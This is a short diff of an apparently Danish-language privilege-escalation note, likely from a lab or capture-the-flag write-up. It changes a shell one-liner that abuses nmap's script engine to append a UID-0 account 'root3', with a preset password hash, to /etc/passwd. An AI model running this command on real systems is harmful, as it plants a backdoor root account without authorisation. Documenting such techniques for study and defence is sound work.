@@ -139,7 +139,7 @@ nmap --script=$TF
 Det her kan vi modificere en smule til at skrive til `/etc/passwd`
 
 ```bash
-TF=$(mktemp) && echo 'local f=io.open("/etc/passwd", "ab"); f:write("\nroot3:EN0jGZIeW.SKM:0:0:root:/root:/bin/bash"); io.close(f);' > $TF && nmap --script=$TF
+TF=$(mktemp) && echo 'local f=io.open("/etc/passwd", "ab"); f:write("\nroot3:OEE5bK0hmfPj.:0:0:root:/root:/bin/bash"); io.close(f);' > $TF && nmap --script=$TF
 ```
 
 **main points**
